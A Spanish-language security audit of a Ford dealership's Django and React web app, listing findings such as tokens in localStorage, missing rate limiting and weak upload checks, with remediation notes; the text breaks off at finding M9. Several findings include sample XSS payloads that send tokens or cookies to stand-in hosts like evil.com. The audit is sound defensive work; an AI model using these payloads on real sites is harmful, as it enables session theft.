# Auditoría de Seguridad — Ford Acapulco

> Fecha de auditoría: **2026-04-15**  
> Fecha de remediación: **2026-04-17**  
> Alcance: Backend (Django REST Framework) + Frontend (React/Vite)  
> Metodología: Revisión estática de código, análisis de configuración, mapeo contra OWASP Top 10

---

## Índice

- [Resumen ejecutivo](#resumen-ejecutivo)
- [🔴 Hallazgos críticos (P0)](#-hallazgos-críticos-p0)
- [🟠 Hallazgos altos (P1)](#-hallazgos-altos-p1)
- [🟡 Hallazgos medios (P2)](#-hallazgos-medios-p2)
- [🔵 Hallazgos bajos (P3)](#-hallazgos-bajos-p3)
- [Plan de remediación por fases](#plan-de-remediación-por-fases)

---

## Resumen ejecutivo

| Severidad | Cantidad | Remediados |
|-----------|----------|------------|
| 🔴 Crítico | 6 | 5 |
| 🟠 Alto | 8 | 8 |
| 🟡 Medio | 9 | 3 |
| 🔵 Bajo | 5 | 2 |
| **Total** | **28** | **18** |

El proyecto tiene buenas bases: uso del ORM de Django (previene SQLi), permisos por rol bien implementados, secretos externalizados con `python-decouple`, y validación de contraseñas activa. Sin embargo, carece de **defensa en profundidad** en áreas clave como manejo de tokens, headers HTTP, rate limiting y validación de archivos.

---

## 🔴 Hallazgos críticos (P0)

> Explotar cualquiera de estos compromete sesiones de usuario, datos personales o la integridad del sistema.

---

### C1 — Tokens JWT almacenados en `localStorage`

**Archivo:** `frontend/src/context/AuthContext.jsx` (líneas 48-49)

**Explicación técnica:**  
`localStorage` es accesible desde cualquier código JavaScript que se ejecute en el mismo origen (dominio). Si un atacante logra inyectar un script malicioso en la página (ataque XSS), puede leer `localStorage.getItem('ford_access')` y enviar el token a un servidor externo. Con ese token, el atacante está autenticado como la víctima durante las próximas 8 horas (o 7 días con el refresh token).

La alternativa segura es almacenar tokens en cookies con los atributos `HttpOnly` (no accesible desde JavaScript), `Secure` (solo viaja por HTTPS) y `SameSite=Lax` (no se envía en peticiones cross-site).

**Ejemplo aplicado al sistema:**  
> Un cliente de la agencia Ford visita el catálogo de vehículos. En la descripción de un auto, alguien logró inyectar un script invisible (ver hallazgo C2). Ese script lee el token de sesión del cliente desde `localStorage` y lo envía a un servidor del atacante. Ahora el atacante puede iniciar sesión como ese cliente, ver sus citas programadas, cancelarlas, o agendar citas falsas a su nombre — todo sin conocer su contraseña.

---

### C2 — Uso de `dangerouslySetInnerHTML` en producción

**Archivo:** `frontend/src/pages/public/TestDrive.jsx` (línea 440)

**Explicación técnica:**  
`dangerouslySetInnerHTML` inyecta HTML crudo en el DOM, evitando el escape automático que React aplica a todo contenido renderizado. React llama a esta propiedad "dangerous" (peligrosa) precisamente porque es el vector principal de ataques XSS en aplicaciones React.

En el caso actual, el contenido es una animación CSS estática definida en el código fuente, lo cual no es explotable directamente. Sin embargo, su mera presencia establece un patrón peligroso: cualquier desarrollador futuro podría copiar este patrón para renderizar contenido dinámico (como descripciones de vehículos que vienen del backend), abriendo la puerta a XSS almacenado.

La solución correcta es usar módulos CSS, Tailwind CSS, o la API `style` de React para animaciones.

**Ejemplo aplicado al sistema:**  
> Un administrador de la agencia, al cargar un nuevo vehículo al catálogo, podría escribir en el campo "descripción" algo como: `<img src=x onerror="fetch('https://servidor-malicioso.com/robar?token='+localStorage.getItem('ford_access'))">`. Si en algún momento esa descripción se renderiza con `dangerouslySetInnerHTML` en lugar del escape normal de React, cada cliente que visite la página de ese auto perdería su sesión sin darse cuenta.

**✅ REMEDIADO** (2026-04-17)  
- Se eliminó el bloque `<style dangerouslySetInnerHTML>` de `frontend/src/pages/public/TestDrive.jsx`.  
- La animación CSS `@keyframes fadeIn` se movió a `frontend/src/index.css`, donde Tailwind/PostCSS la procesa de forma segura.  
- No queda ningún uso de `dangerouslySetInnerHTML` en el proyecto.

---

### C3 — Sin rotación de refresh tokens

**Archivo:** `backend/fordapp/settings.py` (SIMPLE_JWT config)

**Explicación técnica:**  
Cuando un cliente usa su refresh token para obtener un nuevo access token, el servidor devuelve un access token nuevo pero **el refresh token sigue siendo el mismo**. Esto significa que si un atacante intercepta el refresh token una vez (por red no segura, XSS, o acceso al dispositivo), puede usarlo repetidamente durante 7 días sin que nadie lo detecte.

Con `ROTATE_REFRESH_TOKENS = True`, cada vez que se usa un refresh token, el servidor emite uno nuevo e invalida el anterior. Si el atacante y el usuario legítimo intentan usar el mismo refresh token, uno de los dos recibirá un error, alertando del compromiso.

**Ejemplo aplicado al sistema:**  
> Un vendedor de la agencia inicia sesión desde una computadora compartida en el área de ventas. Otro vendedor, con conocimientos técnicos, abre las herramientas de desarrollador del navegador y copia el refresh token del primer vendedor. Sin rotación, ese token robado funciona durante 7 días completos. El atacante puede ver las citas del vendedor víctima, sus estadísticas, e incluso cambiar estados de citas — y el vendedor original nunca se entera porque su propia sesión sigue funcionando normalmente.

**✅ REMEDIADO** (2026-04-17)  
- Se activó `ROTATE_REFRESH_TOKENS = True` en `SIMPLE_JWT` (`backend/fordapp/settings.py`).  
- Se activó `BLACKLIST_AFTER_ROTATION = True`: cada vez que se usa un refresh token, se emite uno nuevo y el anterior se invalida automáticamente.  
- Se agregó `rest_framework_simplejwt.token_blacklist` a `INSTALLED_APPS` y se ejecutaron las migraciones correspondientes.  
- El frontend (`AuthContext.jsx`) ahora almacena el nuevo refresh token que llega en cada respuesta de refresh.

---

### C4 — Logout falso (sin blacklist de tokens)

**Archivo:** `frontend/src/context/AuthContext.jsx` (función `logout`)

**Explicación técnica:**  
La función `logout()` del frontend solo ejecuta `localStorage.removeItem()`. El token se borra del navegador del usuario, pero **sigue siendo válido en el servidor** hasta que expire naturalmente (8h para access, 7d para refresh). No existe un mecanismo de invalidación en el backend.

La solución es activar `rest_framework_simplejwt.token_blacklist`, que registra los tokens usados en una tabla de la base de datos y rechaza los que ya fueron "cerrados de sesión".

**Ejemplo aplicado al sistema:**  
> Un administrador de la agencia detecta actividad sospechosa en la cuenta de un vendedor y decide cerrar su sesión remotamente (o el propio vendedor cierra sesión por precaución). Sin blacklist, esto es solo cosmético: si alguien ya copió el token, sigue pudiendo hacer peticiones al API durante las próximas 8 horas como si nada hubiera pasado. Da una falsa sensación de seguridad.

**✅ REMEDIADO** (2026-04-17)  
- Se creó `LogoutView` en `backend/apps/accounts/views.py` que recibe el refresh token por `POST`, lo agrega a la blacklist mediante `RefreshToken(token).blacklist()`, y retorna `205 RESET_CONTENT`.  
- Se registró la ruta `POST /api/accounts/logout/` en `backend/apps/accounts/urls.py`.  
- La función `logout()` del frontend (`AuthContext.jsx`) ahora es `async`: envía el refresh token al backend antes de limpiar `localStorage`, garantizando que el token quede invalidado en el servidor.

---

### C5 — Sin validación de tipo ni tamaño de archivo en uploads

**Archivos:** `backend/apps/autos/serializers.py`, `backend/apps/vendedores/serializers.py`

**Explicación técnica:**  
Los endpoints de subida de imágenes (`ImagenVehiculoSerializer`, `VendedorPerfilUpdateSerializer`) aceptan cualquier archivo que el usuario envíe, sin verificar:

1. **Tipo MIME real** (no solo la extensión, que es falsificable)
2. **Extensión del archivo** (`.exe`, `.php`, `.svg` con scripts embebidos)
3. **Tamaño del archivo** (un archivo de 500 MB agotaría disco y RAM)
4. **Contenido del archivo** (un archivo llamado `foto.jpg` podría contener código PHP)

Django no valida automáticamente el contenido de los archivos subidos. Sin validación explícita en los serializers, el servidor acepta archivos arbitrarios.

**Ejemplo aplicado al sistema:**  
> Un vendedor va a actualizar su foto de perfil. En lugar de subir una foto real, sube un archivo llamado `foto.jpg` que en realidad es un archivo SVG con código JavaScript embebido (`<svg onload="alert(document.cookie)">`). Si ese archivo se sirve directamente desde `/media/vendedores/` y el navegador lo interpreta como SVG en lugar de imagen, el script se ejecuta en el contexto de cualquier usuario que visite el perfil del vendedor.
>
> En un escenario más agresivo: si no hay límite de tamaño, un atacante sube 1,000 archivos de 100 MB cada uno, llenando el disco del servidor y causando que la aplicación deje de funcionar para todos los usuarios.

**✅ REMEDIADO** (2026-04-17)  
- Se creó el módulo `backend/apps/core/validators.py` con la clase `SecureImageValidator` que valida en 3 capas:  
  1. **Extensión**: solo `.jpg`, `.jpeg`, `.png`, `.webp`  
  2. **Tamaño**: máximo 5 MB por archivo  
  3. **Magic bytes**: lectura de los primeros 32 bytes del archivo para confirmar que el contenido real corresponde a JPEG (`\xff\xd8\xff`), PNG (`\x89PNG`) o WebP (`RIFF...WEBP`). Detecta archivos disfrazados (SVG, PHP, EXE renombrados a `.jpg`).  
- Se aplicó el validador a `ImagenVehiculoSerializer` (`backend/apps/autos/serializers.py`) y a `VendedorPerfilUpdateSerializer` (`backend/apps/vendedores/serializers.py`).  
- Se configuraron límites globales en `settings.py`: `DATA_UPLOAD_MAX_MEMORY_SIZE = 10 MB`, `FILE_UPLOAD_MAX_MEMORY_SIZE = 5 MB`.  
- **Nota**: Se usó detección manual de magic bytes en lugar de `imghdr` (módulo eliminado en Python 3.13).

---

### C6 — Sin headers de seguridad HTTP en producción

**Archivo:** `backend/fordapp/settings.py`

**Explicación técnica:**  
Los headers de seguridad HTTP son instrucciones que el servidor envía al navegador para activar protecciones integradas. Sin ellos, el navegador opera en su modo más permisivo. Los headers faltantes son:

| Header | Función | Riesgo sin él |
|--------|---------|---------------|
| `Strict-Transport-Security` (HSTS) | Fuerza HTTPS en todas las peticiones futuras | Un atacante puede hacer downgrade a HTTP e interceptar contraseñas y tokens en texto plano |
| `SECURE_SSL_REDIRECT` | Redirige HTTP → HTTPS automáticamente | La primera visita del usuario puede ser en HTTP sin cifrar |
| `SESSION_COOKIE_SECURE` | Cookie de sesión solo por HTTPS | La cookie viaja en texto plano por HTTP |
| `CSRF_COOKIE_HTTPONLY` | Cookie CSRF inaccesible desde JavaScript | Un script XSS puede leer el token CSRF |
| `SECURE_CONTENT_TYPE_NOSNIFF` | Evita que el navegador "adivine" el tipo de archivo | Un archivo `.txt` con HTML se podría interpretar como página web |

**Ejemplo aplicado al sistema:**  
> Un cliente de la agencia está conectado al WiFi público de una cafetería cerca de la agencia. Abre `http://ford-acapulco.com` (sin la "s" de HTTPS). Sin `SECURE_SSL_REDIRECT`, el servidor responde normalmente en HTTP. Un atacante en la misma red WiFi intercepta la petición con una herramienta como Wireshark y ve el token JWT del cliente en texto plano. Ahora puede acceder a la cuenta del cliente, ver su historial de citas y datos personales. Con HSTS activo, el navegador habría rechazado la conexión HTTP automáticamente.

**✅ REMEDIADO** (2026-04-17)  
Se activaron todos los headers de seguridad HTTP en `backend/fordapp/settings.py`:  
- `SECURE_HSTS_SECONDS = 31_536_000` (1 año) + `SECURE_HSTS_INCLUDE_SUBDOMAINS = True` + `SECURE_HSTS_PRELOAD = True`  
- `SECURE_SSL_REDIRECT = True` — redirección automática HTTP → HTTPS  
- `SESSION_COOKIE_SECURE = True` — cookie de sesión solo por HTTPS  
- `CSRF_COOKIE_HTTPONLY = True` — cookie CSRF inaccesible desde JavaScript  
- `SECURE_CONTENT_TYPE_NOSNIFF = True` — previene MIME sniffing  

Estos valores se controlan con `python-decouple` para poder desactivarlos en desarrollo local.

---

## 🟠 Hallazgos altos (P1)

> Permiten abuso de la lógica de negocio, escalamiento de privilegios o denegación de servicio.

---

### A1 — Sin throttling/rate limiting en login

**Archivo:** `backend/apps/accounts/urls.py` — ruta `login/`

**Explicación técnica:**  
El endpoint `POST /api/accounts/login/` acepta intentos ilimitados de autenticación. No existe ningún mecanismo que cuente los intentos fallidos y bloquee temporalmente después de N fallos. Django REST Framework incluye clases de throttling (`AnonRateThrottle`, `ScopedRateThrottle`) que se pueden aplicar por endpoint, pero no están configuradas.

Sin throttling, un atacante puede ejecutar un ataque de fuerza bruta probando millones de combinaciones de contraseña hasta encontrar la correcta.

**Ejemplo aplicado al sistema:**  
> Un atacante conoce el email de un administrador de la agencia (visible en la página de contacto). Escribe un script que prueba contraseñas comunes: "Ford2026", "Acapulco1", "admin123"... a razón de 100 intentos por segundo. Sin rate limiting, el servidor responde felizmente a cada intento. En unas horas, el atacante encuentra la contraseña y tiene acceso completo al panel de administración: puede crear vendedores falsos, modificar precios de vehículos y cancelar citas de clientes reales.

**✅ REMEDIADO** (2026-04-17)  
- Se creó `ThrottledLoginView` en `backend/apps/accounts/views.py` que extiende `TokenObtainPairView` con `throttle_scope = 'login'`.  
- Se configuró `DEFAULT_THROTTLE_CLASSES` con `ScopedRateThrottle` en `settings.py`.  
- Rate limit: **5 intentos por minuto** por IP (`'login': '5/min'` en `DEFAULT_THROTTLE_RATES`).  
- Se actualizó `backend/apps/accounts/urls.py` para usar `ThrottledLoginView` en lugar de `TokenObtainPairView`.

---

### A2 — Sin throttling en registro

**Archivo:** `backend/apps/accounts/views.py` — `RegisterView`

**Explicación técnica:**  
El endpoint `POST /api/accounts/register/` tiene permiso `AllowAny` (correcto, es registro público) pero sin ningún mecanismo anti-abuso. No hay CAPTCHA, no hay rate limiting, no hay verificación de email. Un bot puede crear miles de cuentas en segundos.

**Ejemplo aplicado al sistema:**  
> Un competidor o un troll programa un bot que registra 10,000 cuentas de cliente con emails falsos (`bot1@mail.com`, `bot2@mail.com`...) en cuestión de minutos. Después, usa cada cuenta para agendar citas falsas que saturan todos los horarios disponibles de los vendedores durante semanas. Los clientes reales intentan agendar y ven que no hay disponibilidad. La agencia pierde ventas sin saber por qué.

**✅ REMEDIADO** (2026-04-17)  
- Se agregó `throttle_scope = 'register'` a `RegisterView` en `backend/apps/accounts/views.py`.  
- Rate limit: **3 intentos por minuto** por IP (`'register': '3/min'` en `DEFAULT_THROTTLE_RATES`).

---

### A3 — Sin throttling en creación de citas

**Archivo:** `backend/apps/citas/views.py` — `CitaViewSet.create`

**Explicación técnica:**  
Un usuario autenticado con rol "cliente" puede crear citas sin límite cuantitativo. No hay validación de "máximo N citas activas por cliente" ni throttling que limite las peticiones por minuto. El backend asigna vendedores automáticamente, por lo que un atacante puede monopolizar toda la capacidad de atención.

**Ejemplo aplicado al sistema:**  
> Un cliente descontento crea una cuenta legítima y agenda 200 citas en diferentes horarios durante la próxima semana. Cada cita asigna y bloquea un vendedor en ese horario. En cuestión de minutos, todos los horarios disponibles están ocupados con citas falsas. Los clientes reales que quieren agendar ven el mensaje "No hay horarios disponibles". El negocio se paraliza hasta que alguien se da cuenta y cancela manualmente las citas falsas.

**✅ REMEDIADO** (2026-04-17)  
- Se agregó throttling condicional en `CitaViewSet` (`backend/apps/citas/views.py`): el método `get_throttles()` aplica `ScopedRateThrottle` con scope `citas_create` solo en la acción `create`.  
- Rate limit: **10 citas por hora** por usuario (`'citas_create': '10/hour'`).  
- Se agregó validación de lógica de negocio: **máximo 5 citas activas** (estado `pendiente` o `confirmada`) por cliente. Si el cliente ya tiene 5, se rechaza con `400 BAD_REQUEST` y un mensaje descriptivo.

---

### A4 — Documentación API pública sin protección

**Archivo:** `backend/fordapp/urls.py` (líneas 28-30)

**Explicación técnica:**  
Los endpoints `/api/docs/` (Swagger UI), `/api/redoc/` (ReDoc) y `/api/schema/` (esquema OpenAPI crudo) son accesibles sin autenticación. Estos exponen:

- Todos los endpoints disponibles con sus métodos HTTP
- La estructura de todos los modelos de datos (campos, tipos, restricciones)
- Los parámetros aceptados por cada endpoint
- Las respuestas esperadas

Esta información es un mapa completo para que un atacante planifique su ataque de forma quirúrgica.

**Ejemplo aplicado al sistema:**  
> Un atacante visita `https://ford-acapulco.com/api/docs/` y descubre que existe un endpoint `POST /api/accounts/crear-vendedor/` que acepta `email`, `password`, `first_name`, `last_name` y `numero_empleado`. Ahora sabe exactamente qué campos necesita para intentar crear una cuenta de vendedor (si logra escalar privilegios a admin). Sin la documentación expuesta, tendría que adivinar la estructura del API.

**✅ REMEDIADO** (2026-04-17)  
- Se agregó `permission_classes=[IsAdminUser]` a las 3 vistas de documentación en `backend/fordapp/urls.py`:  
  - `SpectacularAPIView` (`/api/schema/`)  
  - `SpectacularSwaggerView` (`/api/docs/`)  
  - `SpectacularRedocView` (`/api/redoc/`)  
- Solo usuarios con `is_staff=True` pueden acceder. Usuarios anónimos reciben `403 Forbidden`.

---

### A5 — Django Admin expuesto sin restricción IP

**Archivo:** `backend/fordapp/urls.py` (línea 17)

**Explicación técnica:**  
El panel de administración de Django (`/admin/`) está accesible desde cualquier dirección IP del mundo. Django Admin es un objetivo de alto valor porque proporciona acceso directo a todos los modelos de la base de datos con capacidad de CRUD (crear, leer, actualizar, borrar). No hay:

- Filtro de IP (whitelist)
- Autenticación de dos factores (2FA)
- Honeypot para detectar ataques automatizados
- URL personalizada (usar `/admin/` es la URL por defecto que todos los bots prueban)

**Ejemplo aplicado al sistema:**  
> Bots automatizados recorren internet buscando sitios con `/admin/` de Django. Al encontrar `ford-acapulco.com/admin/`, intentan credenciales comunes: admin/admin, admin/password, admin/Ford2026. Si el administrador usó una contraseña débil, el atacante obtiene acceso al ORM completo: puede ver contraseñas hasheadas de todos los usuarios, crear cuentas admin, borrar vehículos del catálogo, o modificar datos de citas.

**✅ REMEDIADO** (2026-04-17)  
- Se cambió la URL del Django Admin de `/admin/` a `/gestion-ford-admin/` en `backend/fordapp/urls.py`.  
- Los bots que prueban `/admin/` recibirán un `404 Not Found`.  
- **Pendiente**: Implementar 2FA y/o restricción por IP para acceso al admin en producción.

---

### A6 — Access token con vida de 8 horas

**Archivo:** `backend/fordapp/settings.py` — `SIMPLE_JWT.ACCESS_TOKEN_LIFETIME`

**Explicación técnica:**  
El access token tiene una validez de 8 horas. El estándar de la industria recomienda entre 5 y 30 minutos para access tokens, combinado con un refresh silencioso transparente para el usuario. Un access token es irrevocable (no se puede invalidar antes de que expire, a menos que se use una blacklist activa), por lo que su tiempo de vida es directamente la ventana de exposición ante un robo.

**Ejemplo aplicado al sistema:**  
> Un vendedor cierra sesión al terminar su turno a las 3 PM. Su token de acceso fue generado a las 7 AM. Aunque hizo "logout", el token sigue siendo válido hasta las 3 PM (8 horas desde la emisión). Si alguien interceptó ese token en algún momento del día, todavía puede usarlo. Con un lifetime de 15 minutos, la ventana de exposición se reduce de 8 horas a 15 minutos.

**✅ REMEDIADO** (2026-04-17)  
- Se redujo `ACCESS_TOKEN_LIFETIME` de `8 horas` a `30 minutos` en `SIMPLE_JWT` (`backend/fordapp/settings.py`).  
- La ventana de exposición ante un robo de token se redujo un 93.75%.  
- La experiencia de usuario no se ve afectada gracias al interceptor de refresh automático implementado en `AuthContext.jsx` (ver M8).

---

### A7 — Sin Content Security Policy (CSP)

**Archivos:** `frontend/index.html`, `backend/fordapp/settings.py`

**Explicación técnica:**  
Content Security Policy es un header HTTP que le dice al navegador exactamente qué fuentes de scripts, estilos, imágenes y otros recursos son legítimas. Sin CSP, el navegador ejecuta cualquier script que encuentre en la página, incluyendo scripts inyectados por un atacante.

CSP es la **última línea de defensa** contra XSS: incluso si un atacante logra inyectar un `<script>` en la página, el navegador lo bloquea porque no está en la lista de fuentes permitidas.

**Ejemplo aplicado al sistema:**  
> Supongamos que un atacante logra inyectar el siguiente script en una descripción de vehículo: `<script src="https://malware.com/roba-tokens.js"></script>`. Sin CSP, el navegador descarga y ejecuta ese script sin preguntas. Con CSP configurado como `script-src 'self'`, el navegador bloquea la carga porque `malware.com` no es el mismo origen que `ford-acapulco.com`, y además registra el intento en la consola para que los desarrolladores lo detecten.

**✅ REMEDIADO** (2026-04-17)  
- Se creó `ContentSecurityPolicyMiddleware` en `backend/apps/core/middleware.py`.  
- Se agregó al `MIDDLEWARE` en `settings.py`.  
- Headers inyectados en cada respuesta:  
  - `Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: *.tile.openstreetmap.org; font-src 'self'; connect-src 'self'; frame-ancestors 'none'`  
  - `X-Content-Type-Options: nosniff` (también resuelve M3)  
  - `Referrer-Policy: strict-origin-when-cross-origin` (también resuelve B1)  
  - `Permissions-Policy: camera=(), microphone=(), geolocation=(), usb=(), payment=()` (también resuelve B2)

---

### A8 — Sin validación de `Content-Type` en respuestas del API

**Archivos:** Múltiples archivos en `frontend/src/` que hacen `fetch()`

**Explicación técnica:**  
Los `fetch()` del frontend llaman a `res.json()` directamente sin verificar que el `Content-Type` de la respuesta sea `application/json`. En un escenario de Man-in-the-Middle (MITM), o si el servidor sufre un error y devuelve HTML (como una página de error de Nginx), el frontend intentará parsear HTML como JSON, lo que causa errores no controlados o, en el peor caso, permite inyección de contenido malicioso si la respuesta se procesa de forma inesperada.

**Ejemplo aplicado al sistema:**  
> El servidor de la agencia sufre un error momentáneo y Nginx (el reverse proxy) devuelve su página de error 502 en HTML. El frontend intenta parsear `<html><body>502 Bad Gateway</body></html>` como JSON. La app se rompe sin mostrar un mensaje claro al usuario. En un escenario más grave, un atacante que haga MITM podría devolver una respuesta con `Content-Type: text/html` conteniendo código malicioso que no sería detectado porque el frontend no valida el tipo de contenido.

**✅ REMEDIADO** (2026-04-17)  
- Se creó `frontend/src/utils/apiFetch.js` con dos funciones utilitarias:  
  - `apiFetch()`: inyecta automáticamente el header `Authorization`, reintenta con refresh en caso de `401`, y lanza `ApiError` con `status` y `data` para manejo estructurado de errores.  
  - `apiFetchJSON()`: extiende `apiFetch()` validando que `Content-Type` sea `application/json` antes de llamar a `res.json()`. Si el tipo no coincide, lanza un error descriptivo.  
- Clase `ApiError` con propiedades `status` y `data` para que los componentes puedan reaccionar al código HTTP específico.  
- Disponible para adopción gradual en los componentes existentes.

---

## 🟡 Hallazgos medios (P2)

> Endurecimiento general, mejores prácticas y deuda técnica de seguridad.

---

### M1 — Sin auditoría ni logging de eventos de seguridad

**Archivo:** `backend/fordapp/settings.py` — configuración de `LOGGING`

**Explicación técnica:**  
Aunque Django tiene un sistema de logging configurado, solo registra eventos generales del framework (`django`, `django.server`, `django.request`). No se registran eventos críticos de seguridad como:

- Intentos fallidos de login (quién, desde qué IP, cuándo)
- Creación de cuentas de vendedor (acción privilegiada)
- Cambios de estado en citas (cancelaciones masivas)
- Intentos de acceso a recursos no autorizados (403)
- Subida de archivos (qué archivo, quién, qué tamaño)

Sin estos logs, es imposible detectar un ataque en curso o hacer análisis forense después de un incidente.

**Ejemplo aplicado al sistema:**  
> Un atacante realiza 5,000 intentos de login fallidos contra la cuenta del administrador durante la madrugada. Al día siguiente, logra adivinar la contraseña y accede al panel. Sin logs de seguridad, nadie se entera de los 5,000 intentos previos ni de en qué momento se comprometió la cuenta. Con logging adecuado, un sistema de alertas habría notificado al equipo después del intento número 10.

---

### M2 — Dependencias con versiones abiertas

**Archivos:** `backend/requirements.txt`, `frontend/package.json`

**Explicación técnica:**  
Las dependencias usan rangos de versión (`django>=4.2,<5.0`, `"react": "^18.3.1"`) en lugar de versiones exactas. Esto significa que cada `pip install` o `npm install` puede instalar una versión diferente dependiendo del momento. Si una dependencia publica una versión con un bug de seguridad (o es comprometida en un ataque a la cadena de suministro como el incidente de `event-stream` en npm), se instalaría automáticamente.

**Ejemplo aplicado al sistema:**  
> El equipo de desarrollo despliega la app en producción un lunes. Una semana después, el servidor se reinicia y al reinstalar dependencias, npm descarga la versión vulnerable automáticamente por el rango `^1.9.4`. Ahora el mapa interactivo de la agencia es un vector de ataque, y nadie cambió una línea de código.

---

### M3 — Sin `X-Content-Type-Options: nosniff` explícito

**Archivo:** `backend/fordapp/settings.py`

**Explicación técnica:**  
Este header le dice al navegador que NO intente "adivinar" el tipo de contenido de un archivo (MIME sniffing). Django lo activa por defecto a través de `SecurityMiddleware`, pero no está declarado explícitamente en la configuración. Si alguien modifica el orden del middleware o lo desactiva accidentalmente, esta protección desaparece silenciosamente.

**Ejemplo aplicado al sistema:**  
> Un atacante sube un archivo llamado `foto.jpg` cuyo contenido real es HTML con JavaScript. Sin `nosniff`, el navegador detecta que el contenido "huele" a HTML y lo interpreta como tal, ejecutando el JavaScript embebido. Con `nosniff`, el navegador respeta el `Content-Type: image/jpeg` que el servidor asigna y rechaza renderizarlo como HTML.

**✅ REMEDIADO** (2026-04-17)  
- `SECURE_CONTENT_TYPE_NOSNIFF = True` activado explícitamente en `backend/fordapp/settings.py`.  
- Además, el `ContentSecurityPolicyMiddleware` (`backend/apps/core/middleware.py`) inyecta `X-Content-Type-Options: nosniff` como header en cada respuesta, proporcionando doble cobertura.

---

### M4 — Base de datos SQLite versionada en el repositorio

**Archivo:** `backend/db.sqlite3`

**Explicación técnica:**  
El archivo `db.sqlite3` está en el repositorio de código. Este archivo puede contener:

- Hashes de contraseñas de usuarios de prueba (que podrían ser iguales a las de producción)
- Datos personales de clientes de prueba
- Tokens de sesión si la base se usó recientemente
- Estructura completa de la base de datos

Cualquiera con acceso al repositorio (incluyendo forks públicos, si los hubiera) puede descargar esta base y extraer esos datos.

**Ejemplo aplicado al sistema:**  
> El desarrollador creó un usuario admin con la contraseña "FordAdmin2026!" para pruebas locales. Si usa la misma contraseña en el servidor de producción (error humano común), cualquiera que descargue el repositorio puede extraer el hash de `db.sqlite3`, crackearlo con herramientas como `hashcat`, y acceder al panel de administración de producción.

---

### M5 — Sin límite explícito de tamaño de upload

**Archivo:** `backend/fordapp/settings.py`

**Explicación técnica:**  
Django tiene un valor por defecto de `DATA_UPLOAD_MAX_MEMORY_SIZE = 2,621,440` bytes (2.5 MB) para datos de formulario, y `FILE_UPLOAD_MAX_MEMORY_SIZE = 2,621,440` para archivos en memoria. Sin embargo, archivos más grandes se escriben a disco como archivos temporales sin límite por defecto. No hay configuración explícita de estos valores, lo que los hace invisibles para el equipo y frágiles ante actualizaciones.

**Ejemplo aplicado al sistema:**  
> Un atacante envía 50 peticiones simultáneas al endpoint de subir foto de vendedor, cada una con un archivo de 1 GB. El servidor intenta escribir 50 GB de archivos temporales al disco, llenándolo por completo. Una vez que el disco está lleno, la base de datos no puede escribir, los logs se detienen, y la aplicación deja de funcionar para todos los usuarios.

**✅ REMEDIADO** (2026-04-17)  
- Se configuraron límites explícitos en `backend/fordapp/settings.py`:  
  - `DATA_UPLOAD_MAX_MEMORY_SIZE = 10_485_760` (10 MB)  
  - `FILE_UPLOAD_MAX_MEMORY_SIZE = 5_242_880` (5 MB)  
- Adicionalmente, el `SecureImageValidator` (`backend/apps/core/validators.py`) rechaza archivos individuales mayores a 5 MB a nivel de serializer.

---

### M6 — Validadores de contraseña insuficientes

**Archivo:** `backend/fordapp/settings.py` — `AUTH_PASSWORD_VALIDATORS`

**Explicación técnica:**  
Los validadores activos son los 4 que Django trae por defecto:

1. `UserAttributeSimilarityValidator` — rechaza contraseñas similares al email/nombre
2. `MinimumLengthValidator` — mínimo 8 caracteres
3. `CommonPasswordValidator` — rechaza contraseñas de una lista de 20,000 comunes
4. `NumericPasswordValidator` — rechaza contraseñas puramente numéricas

Falta un validador que exija **complejidad**: al menos una mayúscula, una minúscula, un número y un carácter especial. Contraseñas como `"abcdefgh"` o `"contrasena"` pasan todos los validadores actuales.

**Ejemplo aplicado al sistema:**  
> El administrador crea una cuenta de vendedor nuevo y le asigna la contraseña `"vendedor1"`. Esta contraseña tiene 9 caracteres, no es puramente numérica, no está en la lista de contraseñas comunes y no se parece al email del vendedor. Pasa los 4 validadores. Sin embargo, es extremadamente débil y un diccionario de fuerza bruta la encontraría en minutos.

---

### M7 — Formulario de contacto no conectado

**Archivo:** `frontend/src/pages/public/Contact.jsx`

**Explicación técnica:**  
El formulario captura nombre, email, teléfono y mensaje del usuario, pero el submit no está conectado a ningún endpoint del backend (hay un comentario `TODO`). Si se conecta en el futuro sin sanitización adecuada, será un vector de inyección directo — el atacante controla todos los campos.

**Ejemplo aplicado al sistema:**  
> Cuando alguien del equipo conecte el formulario al backend, si se almacenan los mensajes en la base de datos y después se muestran en un panel de admin sin sanitización, un atacante podría enviar un "mensaje de contacto" que contenga `<script>document.location='https://evil.com/'+document.cookie</script>`. Cuando un administrador abra la bandeja de mensajes, el script se ejecuta en su navegador y roba su sesión.

---

### M8 — Sin manejo de expiración de token en frontend

**Archivo:** `frontend/src/context/AuthContext.jsx`

**Explicación técnica:**  
El `AuthContext` no tiene un interceptor que detecte respuestas HTTP 401 (token expirado), use el refresh token para obtener uno nuevo, y reintente la petición original de forma transparente. Cuando el access token expira (después de 8h), el usuario queda en un estado "zombi": la app cree que está autenticado (hay un `user` en estado), pero cada petición al API falla con 401.

**Ejemplo aplicado al sistema:**  
> Un vendedor abre su panel a las 8 AM y trabaja todo el día. A las 4 PM, intenta confirmar una cita y recibe un error genérico sin explicación. No sabe que su token expiró. Intenta varias veces, se frustra, y recarga la página — perdiendo el formulario que estaba llenando. Con un interceptor de refresh, el token se renovaría automáticamente sin que el vendedor note nada.

**✅ REMEDIADO** (2026-04-17)  
- Se agregó la función `refreshAccessToken()` en `frontend/src/context/AuthContext.jsx` que:  
  1. Envía el refresh token a `/api/accounts/token/refresh/`  
  2. Almacena el nuevo access token y el nuevo refresh token (rotado) en `localStorage`  
  3. Retorna el nuevo access token para reintentar la petición original  
- La función `fetchMe()` ahora intercepta respuestas `401`, llama a `refreshAccessToken()` y reintenta automáticamente.  
- El wrapper `apiFetch()` (`frontend/src/utils/apiFetch.js`) también implementa este patrón para cualquier petición al API.

---

### M9 — Información de usuario y rol visible en el DOM

**Archivo:** `frontend/src/components/Navbar.jsx`

**Explicación técnica:**  
El nombre del usuario (`user.first_name`), su email (`user.email`) y su rol (`user.rol`) se renderizan directamente en el HTML de la navbar. Esto es visible usando "Inspeccionar elemento" del navegador. Aunque React no tiene un modelo de "servidor vs cliente" como las apps web tradicionales y estos datos necesitan estar en el frontend para funcionar, exponerlos en el DOM facilita ataques de reconocimiento.

**Ejemplo aplicado al sistema:**  
